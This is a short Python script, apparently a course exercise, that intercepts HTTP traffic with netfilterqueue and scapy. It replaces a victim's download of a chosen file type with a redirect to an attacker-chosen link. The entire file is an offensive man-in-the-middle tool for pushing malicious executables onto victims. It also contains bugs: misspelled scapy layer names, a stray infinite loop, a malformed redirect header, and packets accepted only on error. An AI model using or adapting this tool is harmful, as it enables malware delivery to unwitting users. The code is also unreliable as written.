#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy
import optparse

ack_list =[]

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--file_type", dest="file_type", help="Select file type e.g. \".exe\"")
    parser.add_option("-l", "--link", dest="link", help="Link to download file")
    (options, arguments) = parser.parse_args()

    if not options.file_type:
        parser.error("[-] Please specify file type use --help for mor info.")
    elif not options.link:
        parser.error("[-] Please specify link to download, use --help for mor info.")

    return options

def set_load(packet):
    packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\n Location: " + options.link

    del packet[scapy.IP].len
    del packet[scapy.Ip].chksum
    del packet[scapy.TPC].chksum

    return packet

def process_packet(packet):
    try:
        while True:
            scapy_packet = scapy.IP(packet.get_payload())
            print(scapy_packet.show())
            if scapy_packet.haslayer(scapy.Raw):
                if scapy_packet[scapy.TCP].dport == 80:
                    if options.file_type in scapy_packet[scapy.Raw].load:
                        print("[+] exe Request")
                        ack_list.append(scapy_packet[scapy.TCP].ack)
                elif scapy_packet[scapy.TCP].sport == 80:
                    if scapy_packet[scapy.TCP].seq in ack_list:
                        ack_list.remove(scapy_packet[scapy.TCP].seq)
                        print("[+] Replacing file")
                        modified_packet = set_load(scapy_packet)
                        packet.set_payload(str(modified_packet))
                else:
                    print("Dont have access to scapy.TCP")
    except IndexError:
        print("This website is HTTPS")

        packet.accept()

options = get_arguments()

try:
    while True:
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, process_packet)
        queue.run()
except KeyboardInterrupt:
    print("[-] Detected CTRL+C ... Stopped spoofing target")